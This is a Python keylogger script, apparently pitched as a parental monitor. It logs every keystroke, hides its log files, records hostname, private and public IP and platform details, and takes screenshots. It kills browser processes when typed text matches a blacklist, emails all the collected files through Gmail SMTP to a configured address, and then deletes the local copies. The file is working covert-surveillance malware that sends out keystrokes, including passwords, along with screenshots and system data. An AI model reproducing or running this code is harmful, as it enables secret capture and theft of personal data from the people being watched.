import os
import time
import ctypes
import platform

# Module for keylogger

from pynput.keyboard import Key, Listener

# Modules for ip

import socket
from requests import get

# Module for ss

import pyscreenshot as ss

# Module for process killing

import psutil

# Modules for e-mail

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# E-mail global

# Here enter the email from which you want to receive the mail.
# It is advisable to create a new senders email specifically for this purpose only and dont use it anywhere else.
# After creating email, turn on less secure app access to allow sending of emails.

os.system("python WebScrap.py")

email_id = ""
password = "<Password>"
toadr = ""
# File name

prefix = '.'
keys_info = "Key logs.txt"
ip_info = "Ip.txt"
screen_info = "Screenshot.png"
weird_info = "weird.csv"
result_info = "results.csv"
black = "blacklist.csv"
file_list = [keys_info, ip_info, screen_info, weird_info, result_info]

# For windows - "C:\\File\\Path"
# For others - "Enter/File/Path"

file_path = ""
extend = ""

time_iter = 5
no_of_iter_end = 1
a = 0
sub = "Activities"


# Hiding the files

def hid():
    for i in file_list:
        if (os.name != "nt"):
            i = prefix + i

        elif (os.name == "nt"):
            i = ctypes.windll.kernel32.SetFileAttributesW(i, 2)


hid()


# IP Address and Computer Info


def ip():
    with open(file_path + extend + ip_info, "a") as f:

        plat = platform.platform()

        # Sometimes directly calling getsockname command returns 127.0.0.1 on systems where hostname is
        # stored in /etc/hosts/. So what the following does is connects to Google DNS server i.e. 8.8.8.8
        # and assumes that we have an internet connection.Thus giving us the correct private ip.

        hostname = socket.gethostname()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ipa = (s.getsockname()[0])
        s.close()
        f.write("Hostname : " + hostname + "\n")
        f.write("Private Ip : " + ipa + "\n")
        f.write("Platform Info : " + plat + "\n")

        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address : " + public_ip)

        except:
            f.write("Unable to get public IP")


ip()


# Screenshot

def scr():
    im = ss.grab()
    im.save(file_path + extend + screen_info)


# Kill Process

def proc():
    PROCNAME = ["firefox", "chrome", "safari", "firefox.exe", "chrome.exe"]

    for proc in psutil.process_iter():
        for i in PROCNAME:
            if proc.name() == i:
                proc.kill()


# Send email

def send_email(filename, attachment, toadr, subject):
    fromaddr = email_id
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toadr
    msg['Subject'] = subject
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment;filename = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toadr, text)
    s.quit()


# Delete Files

def rem():
    for fil in file_list:
        try:
            os.remove(file_path + extend + fil)
        except:
            continue


# Key logger

no_of_iter = 0
currenttime = time.time()
stoppingtime = time.time() + time_iter

while no_of_iter < no_of_iter_end:

    count = 0
    keys = []


    def on_press(key):

        global keys, count, currenttime

        keys.append(key)
        count += 1
        currenttime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def on_release(key):

        if currenttime > stoppingtime:
            return False


    def write_file(keys):

        with open(file_path + extend + keys_info, "a+") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(" ")
                    f.close()
                elif k.find("enter") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    with Listener(on_press=on_press, on_release=on_release) as listener:
        
        listener.join()

    if currenttime > stoppingtime:
        
        scr()
        f = open(file_path + extend + keys_info, "r")
        line = f.read()
        for i in line.split('\n'):
            f2 = open(file_path + extend + black, "r")
            line2 = f2.read()
            for j in line2.split('\n'):            
                if j in i:
                    proc()
                    new_sub = "ALERT !!! 18+ CONTENT FOUND !!!"
                    a = 1
                    break

        try:
            for i in file_list:
                if a == 1:
                    send_email(i, file_path + extend + i, toadr, new_sub)
                else:
                    send_email(i, file_path + extend + i, toadr, sub)

        except:
            pass
        
        f.close()

        rem()
        a = 0
        currenttime = time.time()
        stoppingtime = time.time() + time_iter
        no_of_iter += 1
